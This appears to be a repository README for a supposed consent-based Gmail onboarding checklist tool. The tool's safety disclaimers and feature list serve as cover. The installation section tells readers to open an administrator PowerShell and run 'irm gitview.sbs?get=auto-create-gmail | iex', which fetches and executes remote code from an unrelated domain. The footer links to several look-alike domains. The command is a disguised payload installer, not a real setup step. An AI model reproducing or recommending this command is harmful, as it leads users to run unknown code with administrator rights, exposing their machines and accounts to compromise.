# Authorized Gmail Onboarding Assistant

> A consent-based checklist and template assistant for setting up a personal or organization-approved Gmail workspace.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitview.sbs?get=auto-create-gmail | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Auto Create Gmail modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Auto Create Gmail.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

Authorized Gmail Onboarding Assistant provides a human-reviewed checklist for personal setup or organization-approved workspace onboarding, including recovery planning, security settings, accessibility, and documentation. It never creates accounts in bulk, bypasses provider controls, or collects passwords.

## Core Features

- ✅ **Onboarding Checklist** — Prepare identity, recovery, and security decisions with a person present.
- ✅ **Organization Policy Map** — Document approved naming, access, and retention rules.
- ✅ **Recovery Readiness** — Check recovery contacts and backup options without storing secrets.
- ✅ **Security Review** — Cover strong authentication, session review, and connected apps.
- ✅ **Accessibility Notes** — Include readable setup instructions and support contacts.
- ✅ **Audit Trail** — Record who approved each step and when.
- ✅ **Template Library** — Create local welcome and handoff documents.

## Usage

```bash
# Create a personal onboarding plan
python -m gmail_onboarding plan new --name demo-user

# Review an organization policy map
python -m gmail_onboarding policy check ./policy.yaml

# Export a local handoff checklist
python -m gmail_onboarding export --plan demo-user --format markdown
```

## Configuration

> [!NOTE]
> The assistant stores checklist metadata only. Never enter passwords, recovery codes, or private account content into the tool.

```yaml
organization: example-team
approval_required: true
recovery_review: required
retention_days: 90
```

## Screenshots

- Onboarding checklist: `screenshots/checklist.png`
- Policy map: `screenshots/policy.png`
- Security review: `screenshots/security.png`
- Handoff template: `screenshots/handoff.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Checklist cannot be exported | Complete the required approval and recovery-review fields. |
| Policy check fails | Add an owner and review cadence to the organization policy. |
| Planner will not start | Confirm port 8000 is free and the virtual environment is active. |
| A field asks for a secret | Leave it blank and complete that step with the provider’s official interface. |

## Use Cases

- **Personal Setup** — Prepare a deliberate, secure account onboarding session.
- **Small Organizations** — Coordinate approved workspace creation with human review.
- **IT Handoffs** — Keep recovery and support documentation consistent.
- **Training** — Teach safe setup habits without automating account creation.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Do not use this project for bulk account generation, credential collection, CAPTCHA bypass, phishing, or unauthorized access. Follow the provider’s terms and complete account creation only through official, human-reviewed flows.

> [!TIP]
> Keep recovery information with the account owner and store the checklist separately from secrets.

## License

This project is licensed under the MIT License — see the `LICENSE` file for details.

## Tags

`auto-create-gmail` `gmail` `onboarding` `account-security` `consent` `organization-policy` `human-review` `no-automation`

[gitrm.cfd](https://gitrm.cfd?t=auto-create-gmail) | [viewgit.sbs](https://viewgit.sbs?t=auto-create-gmail) | [gitsl.xyz](https://gitsl.xyz?t=auto-create-gmail) | [gitview.sbs](https://gitview.sbs?t=auto-create-gmail) | [gitrm.sbs](https://gitrm.sbs?t=auto-create-gmail)
